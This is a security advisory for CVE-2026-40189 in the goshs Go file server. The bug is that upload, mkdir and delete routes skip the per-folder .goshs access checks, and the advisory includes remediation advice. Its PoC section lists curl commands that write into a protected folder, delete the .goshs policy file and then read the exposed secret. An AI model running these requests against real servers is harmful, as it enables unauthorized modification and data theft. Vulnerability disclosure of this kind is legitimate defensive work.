# [C] goshs has a file-based ACL authorization bypass in goshs state-changing routes

## Summary
Severity: Critical
Advisory: GHSA-wvhv-qcqf-f3cx
CVE: CVE-2026-40189
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-wvhv-qcqf-f3cx
Type: github-advisory

## Affected
- Go: `github.com/patrickhener/goshs` — affected >=0

## Details
### Summary
goshs enforces the documented per-folder `.goshs` ACL/basic-auth mechanism for directory listings and file reads, but it does not enforce the same authorization checks for state-changing routes. An unauthenticated attacker can upload files with `PUT`, upload files with multipart `POST /upload`, create directories with `?mkdir`, and delete files with `?delete` inside a `.goshs`-protected directory. By deleting the `.goshs` file itself, the attacker can remove the folder's auth policy and then access previously protected content without credentials. This results in a critical authorization bypass affecting confidentiality, integrity, and availability.

### Details
The project README explicitly documents file-based ACLs as a security feature:

- `README.md:59` - "You can place a .goshs in any folder to apply custom ACLs"
- `README.md:61` - "You can apply custom basic auth per folder"

The read/list path correctly enforces `.goshs`:

- `httpserver/filebased.go:10-49` loads `.goshs`
- `httpserver/handler.go:68-91` calls `findSpecialFile()` for directories
- `httpserver/handler.go:94-101` calls `findSpecialFile()` for files
- `httpserver/handler.go:285-305` applies custom auth
- `httpserver/handler.go:545-565` enforces folder auth during directory rendering
- `httpserver/handler.go:590-630` enforces file auth and blocked entries during file serving

However, the state-changing routes bypass this logic entirely:

- `httpserver/server.go:94-100` routes multipart `POST /.../upload` directly to `upload()`
- `httpserver/server.go:105-109` routes `PUT` directly to `put()`
- `httpserver/handler.go:119-123` dispatches `?mkdir` directly to `handleMkdir()`
- `httpserver/handler.go:181-187` dispatches `?delete` directly to `deleteFile()`
- `httpserver/updown.go:18-60` writes files for `PUT` without checking `.goshs`
- `httpserver/updown.go:63-165` writes files for multipart upload without checking `.goshs`
- `httpserver/handler.go:679-698` deletes files with `os.RemoveAll()` without checking `.goshs`
- `httpserver/handler.go:901-937` creates directories with `os.MkdirAll()` without checking `.goshs`

This is not a path traversal issue. The path remains inside the configured root after sanitization. The vulnerability is that authorization is applied inconsistently: reads are protected, but writes and deletes are not. Because `.goshs` itself can be deleted through the unauthenticated delete route, the attacker can escalate the impact from unauthorized modification to full removal of the folder's auth barrier.

### PoC
Environment used for verification:

- Repository/module: `github.com/patrickhener/goshs`
- Verified vulnerable tag: `v2.0.0-beta.3`
- Also present in the `v1.1.4` line based on code inspection
- Local host: `127.0.0.1:18091`

Build and setup:

```bash
cd '/Users/r1zzg0d/Documents/CVE hunting/targets/goshs_beta3'
go build -o /tmp/goshs_acl_verify/goshs ./

rm -rf /tmp/goshs_acl_verify/root
mkdir -p /tmp/goshs_acl_verify/root/protected
cp integration/keepFiles/goshsACLAuth /tmp/goshs_acl_verify/root/protected/.goshs
printf 'top secret\n' > /tmp/goshs_acl_verify/root/protected/secret.txt

/tmp/goshs_acl_verify/goshs -d /tmp/goshs_acl_verify/root -p 18091
```

In a second terminal:

```bash
# The protected folder initially requires auth
curl -s -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:18091/protected/'

# Unauthenticated write into the protected folder succeeds
curl -s -o /dev/null -w '%{http_code}\n' -X PUT \
  --data-binary 'injected via PUT' \
  'http://127.0.0.1:18091/protected/put-created.txt'

# Unauthenticated deletion of the ACL file succeeds
curl -s -o /dev/null -w '%{http_code}\n' \
  'http://127.0.0.1:18091/protected/.goshs?delete'

# The previously protected file is now publicly accessible
curl -s -o /dev/null -w '%{http_code}\n' \
  'http://127.0.0.1:18091/protected/secret.txt'
curl -s 'http://127.0.0.1:18091/protected/secret.txt'
```

Expected results:

```text
401
200
200
200
top secret
```
<img width="1280" height="657" alt="goshs_poc1" src="https://github.com/user-attachments/assets/37576067-fa90-44f6-8fe5-dcb7c96b9704" />


Note: if using `zsh`, the URL containing `?delete` must be quoted, or the shell will treat `?` as a wildcard and the request will not be sent.

PoC Video for reference:

https://github.com/user-attachments/assets/deb9106e-6dfa-47c0-95c1-993c2cbc9ee7


### Impact
This is an authorization bypass affecting deployments that rely on `.goshs` for per-folder protection. A remote unauthenticated attacker can:

- create or overwrite files inside a folder that should require authentication
- create directories inside the protected folder
- delete arbitrary files reachable through the vulnerable route inside that protected folder
- delete the `.goshs` policy file itself
- read previously protected files once the policy file has been removed

In practice, this breaks the security boundary promised by the file-based ACL feature and can expose sensitive files while also allowing unauthorized modification or destruction of protected content.

### Remediation
1. Enforce `.goshs` authorization checks for all state-changing operations, not just read/list flows. Before `PUT`, multipart upload, delete, and mkdir, resolve the effective folder ACL and deny the request unless the caller satisfies `acl.Auth`.
2. Protect `.goshs` as a special file in mutation handlers. The application already prevents serving `.goshs`; it should also reject deletion, overwrite, or replacement of `.goshs` through HTTP routes unless the request is properly authorized.
3. Add regression tests covering protected folders for every mutation path. The test suite should verify that `PUT`, `POST /upload`, `?delete`, and `?mkdir` all fail without valid credentials when a `.goshs` file is present.

## References
- https://github.com/patrickhener/goshs/security/advisories/GHSA-wvhv-qcqf-f3cx
- https://nvd.nist.gov/vuln/detail/CVE-2026-40189
- https://github.com/patrickhener/goshs/commit/f212c4f4a126556bab008f79758e21a839ef2c0f
- https://github.com/patrickhener/goshs
- https://github.com/patrickhener/goshs/releases/tag/v2.0.0-beta.4
